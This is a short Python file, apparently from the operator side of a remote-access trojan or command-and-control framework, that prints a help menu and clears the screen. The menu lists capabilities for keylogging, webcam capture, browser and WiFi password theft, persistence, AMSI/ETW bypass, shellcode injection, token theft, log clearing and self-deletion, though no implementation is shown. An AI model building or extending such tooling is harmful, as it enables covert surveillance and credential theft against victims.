import os

from server.ui.prompt import print_colored


def handle_help():
    help_text = '''
  [ SYSTEM ]
    quit                        Terminate Session
    clear                       Clear Screen
    help                        Show This Menu
    background                  Background current session

  [ FILE MANAGER ]
    ls                          List Directory
    cd <path>                   Change Directory
    pwd                         Show Current Directory
    rm <file>                   Delete File
    rm -r <dir>                 Delete Directory (Recursive)
    mv <src> <dst>              Move File
    upload <file>               Upload Local File -> Target
    download <path>             Download Target File -> Local

  [ SURVEILLANCE ]
    screenshot                  Capture Screenshot
    webcam                      Capture Webcam
    clipboard                   Get Clipboard Content
    keylog_start                Start Keylogger
    keylog_dump                 Dump Keystrokes
    keylog_stop                 Stop Keylogger

  [ RECONNAISSANCE ]
    sysinfo                     Detailed System Information
    check_admin                 Check Privileges
    wifi_dump                   Extract WiFi Passwords
    browser_creds               Extract Browser Passwords
    ip addr                     Show Network Config
    ps                          List Processes
    kill <pid>                  Kill Process by PID
    pkill <name>                Kill Process by Name

  [ PERSISTENCE ]
    persistence list                List available methods
    persistence install <method>    Install persistence (crontab, registry, etc)
    persistence remove <method>     Remove persistence
    persistence check               Verify installed persistence

  [ EVASION ]
    evasion                       Apply AMSI+ETW bypasses (auto on connect)
    detect_vm                     Detect VM/Sandbox
    inject <pid|name> [shellcode] Inject shellcode into process
    steal_token <pid>             Steal and impersonate process token
    rev2self                      Revert to own token
    whoami                        Show current user context
    priv_enable <privilege>       Enable a token privilege
    clear_logs                    Clear Windows/Linux event logs
    timestomp <path>              Modify file timestamps
    self_delete                   Delete agent binary on disk
'''
    print_colored(help_text, 'cyan')


def handle_clear():
    os.system('cls' if os.name == 'nt' else 'clear')
